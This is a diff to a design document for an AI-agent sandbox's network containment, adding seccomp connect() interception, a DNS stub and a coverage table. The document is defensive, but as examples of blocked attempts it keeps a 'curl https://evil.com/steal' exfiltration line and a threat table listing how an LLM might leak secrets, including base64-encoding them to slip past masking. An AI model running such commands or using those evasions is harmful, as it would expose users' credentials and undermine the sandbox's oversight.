@@ -7,7 +7,9 @@ given controlled outbound access one way only: an HTTP proxy on the sandbox's
 loopback, advertised through `HTTP_PROXY` / `HTTPS_PROXY`, which forwards each
 request for `host:port` over a Unix domain socket to a proxy thread in the
 per-call broker. A program that honors the proxy variables reaches allowlisted
-hosts by name; a program that does not has no network.
+hosts by name; a program that does not has no network — unless the host has
+connect() interception (kernel 5.19+), which tunnels its `connect()` through
+the same proxy ([below](#connect-interception)).
 
 Secrets reach a child two ways: the trusted parent interpolates `{{SECRET:name}}` in the tool arguments just before dispatch, and referenced secrets are also set as `CCLAW_SECRET_<NAME>` environment variables — in both cases only secrets the agent is granted (grants kind `secret`, [security.md](security.md#using-a-secret-is-a-grant)). The stored command keeps the placeholder, never the value. Output is masked before storage. See [security.md](security.md).
 
@@ -45,6 +47,10 @@ namespace:
   scratch dir and renamed into place). A program that honors them is decided by
   the proxy; nothing stops one that does not, and any local process can reach
   the listener during the call. That is what `advisory` promises, and no more.
+- **`NE_NOTIF`, shell under `firewalled` (and `advisory` when the host has
+  it)**: as `NE_ENV`, plus a seccomp filter that hands every `connect()` to
+  the broker, which tunnels it through the proxy
+  ([containment.md](containment.md#connect-interception)).
 
 **Terminology: "broker" vs "proxy" are not the same scope.** "Broker" names
 the whole forked per-call tool worker (`tool_shell_handler` et al.) — it sets
@@ -109,8 +115,18 @@ shell: curl https://evil.com/steal
      evil.com — request access via request_config …" to the tool result
 
 anything that ignores the proxy variables: ./tool --connect evil.com
+  (a host without connect() interception)
   1. connect() in a namespace with no interfaces and no routes
   2. ENETUNREACH (or a failed name lookup first: there is no DNS either)
+
+the same, with connect() interception: nc api.github.com 443
+  1. nc resolves api.github.com: the DNS stub on 127.0.0.1:53 answers
+     198.18.0.1 (a name's own address for the call; nothing is looked up)
+  2. nc calls connect(198.18.0.1:443); the seccomp filter hands it to the
+     broker's supervisor
+  3. the supervisor takes nc's socket, connects it to net_shim, sends
+     "CONNECT api.github.com:443", reads "200", returns 0
+  4. from here as the curl flow from step 3; a refusal is ECONNREFUSED
 ```
 
 ## net_shim
@@ -162,25 +178,47 @@ numeric target needs a literal-IP or CIDR grant of its own. See
 
 ## Coverage: what gets network inside the sandbox
 
-One rule: **a program that honors `HTTP_PROXY` / `HTTPS_PROXY` (either case)
-reaches allowlisted hosts; anything else has no network.** How the program
-was linked no longer matters.
+One rule without connect() interception: **a program that honors
+`HTTP_PROXY` / `HTTPS_PROXY` (either case) reaches allowlisted hosts;
+anything else has no network.** With it (kernel 5.19+, `--doctor` says
+"connect() interception yes") every TCP `connect()` is decided by the proxy
+too. How the program was linked does not matter.
 
-| Program | Network? |
-|---|---|
-| `web_fetch`, `js_eval` (cclaw's own libcurl) | Yes |
-| `curl`, `wget`, `git` over https, `pip`, `npm`, `cargo`, `apt` | Yes |
-| Go tools on `net/http` (`gh`, `kubectl`, `terraform`), static or not | Yes |
-| Python `requests`/`urllib`, Ruby `net/http`, most HTTP libraries | Yes |
-| `git` over ssh | Yes — `GIT_SSH_COMMAND` is preset |
-| `ssh` | With `-o ProxyCommand="$CCLAW_CONNECT %h %p"` |
-| HTTP clients that ignore the variables (Node's built-in `fetch` without its proxy option, a JVM without proxy flags) | No, until told about the proxy their own way |
-| Raw sockets: `nc`, `socat`, a script calling `socket.connect()`, database clients | No |
+| Program | In the namespace | … with interception | No namespace, interception (`NE_NOTIF`) |
+|---|---|---|---|
+| `web_fetch`, `js_eval` (cclaw's own libcurl) | Yes | Yes | Yes |
+| `curl`, `wget`, `git` over https, `pip`, `npm`, `cargo`, `apt` | Yes | Yes | Yes |
+| Go tools on `net/http` (`gh`, `kubectl`, `terraform`), static or not | Yes | Yes | Yes |
+| Python `requests`/`urllib`, Ruby `net/http`, most HTTP libraries | Yes | Yes | Yes |
+| `git` over ssh | Yes — `GIT_SSH_COMMAND` is preset | Yes | Yes |
+| `ssh` | With `-o ProxyCommand="$CCLAW_CONNECT %h %p"` | Yes | With the ProxyCommand (no DNS) |
+| HTTP clients that ignore the variables (Node's built-in `fetch`, a JVM without proxy flags) | No | Yes, by name | Literal addresses only (no DNS) |
+| TCP clients: `nc`, `socat`, `socket.connect()`, database clients | No | Yes, by name | Literal addresses only (no DNS) |
+| The host's own loopback (`127.0.0.1:<port>`) | No | No | Yes, directly — the agent's dev servers and anything else listening there |
+| UDP, ICMP (`ping`), raw sockets, DNS tools (`dig`) | No | No (the stub answers only A/AAAA through the resolver) | No: such sockets cannot be made |
 
-The last two rows fail safe, not open. If a tool call gets "network
+The "No" cells fail safe, not open. If a tool call gets "network
 unreachable" or a failed name lookup with no proxy DENIED/ERROR logged, the
-program never talked to the proxy. Raw TCP to arbitrary services is what
-containment `none` is for.
+program never talked to the proxy; with interception a refusal is
+`ECONNREFUSED` and the proxy's note is in the tool result. Raw TCP to
+arbitrary services without a grant, and UDP, are what containment `none` is
+for.
+
+### connect() interception
+
+The shell's seccomp filter hands `connect()` to a supervisor thread in the
+broker, which connects the caller's own socket to `net_shim` and performs the
+`CONNECT host:port` handshake on it before returning 0 — the program keeps a
+real TCP socket (non-blocking mode, `TCP_NODELAY` and `poll` behave as
+usual), and the decision is the proxy's, as for any other connection. In the
+namespace it is a convenience: a DNS stub on `127.0.0.1:53` (resolv.conf is
+replaced in the mount namespace) hands each name an address from
+`198.18.0.0/15` that the supervisor maps back to the name, so the proxy
+resolves and checks the real one. Without a namespace it is the enforcer for
+`firewalled`: no UDP or raw sockets, no Fast Open sends, no ptrace, and no
+call is ever continued. Mechanism, refusals and limits:
+[containment.md](containment.md#connect-interception). A `connect()` blocks
+until the proxy has dialled the destination, even on a non-blocking socket.
 
 ### `channel_runner`: a separate process with its own, narrower control
 
@@ -228,7 +266,7 @@ LLM is told: "You have these secrets available as env vars: `$CCLAW_SECRET_GITHU
 |--------|-----------|
 | Shell leaks secret via `echo $SECRET` | Output masking catches it |
 | Shell exfiltrates to attacker host | Proxy denies unlisted hosts |
-| Program ignores or unsets the proxy variables | CLONE_NEWNET — zero network |
+| Program ignores or unsets the proxy variables | CLONE_NEWNET — zero network; with interception its `connect()` goes through the proxy anyway |
 | LLM puts secret value in command string | Future: command safety gate (pattern check) |
 | LLM encodes secret (base64) to evade masking | Partial: mask common encodings; accepted risk |
 | Shell reads filesystem secrets | CLONE_NEWNS — `/` ro, workspace has no secrets |
@@ -271,6 +309,7 @@ could resolve first and connect by number second, were removed in v0.6.2.
 ## Implementation Status (all shipped)
 
 - In-sandbox proxy helper (`src/net_shim.c`), started by `contain_linux.c`
+- connect() interception and the DNS stub (`src/contain_linux_notif.c`)
 - Egress decision + relay in the broker (`src/proxy.c`)
 - Secret env-var injection for shell children
 - Output secret masking (DLP scanner, see specs/security.md)
